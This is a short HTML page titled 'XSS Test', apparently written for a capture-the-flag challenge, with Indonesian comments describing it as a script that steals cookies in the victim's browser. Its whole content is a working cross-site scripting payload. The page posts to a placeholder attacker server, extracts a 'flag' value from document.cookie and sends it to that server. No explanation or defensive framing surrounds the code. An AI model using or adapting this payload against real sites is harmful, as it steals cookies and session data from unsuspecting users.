<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Test</title>
    <script>
        // Skrip XSS untuk mencuri cookie
        fetch('http://<YOUR_SERVER>/report/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ url: 'http://example.com/xss.html' })
        }).then(response => response.json())
          .then(data => {
              if (data.success) {
                  // Skrip ini akan dijalankan di browser korban
                  const flag = document.cookie.match(/flag=([^;]+)/);
                  if (flag) {
                      fetch('http://<YOUR_SERVER>/report/', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({ url: 'http://example.com/storeflag?flag=' + flag[1] })
                      });
                  }
              }
          });
    </script>
</head>
<body>
    <h1>XSS Test</h1>
</body>
</html>
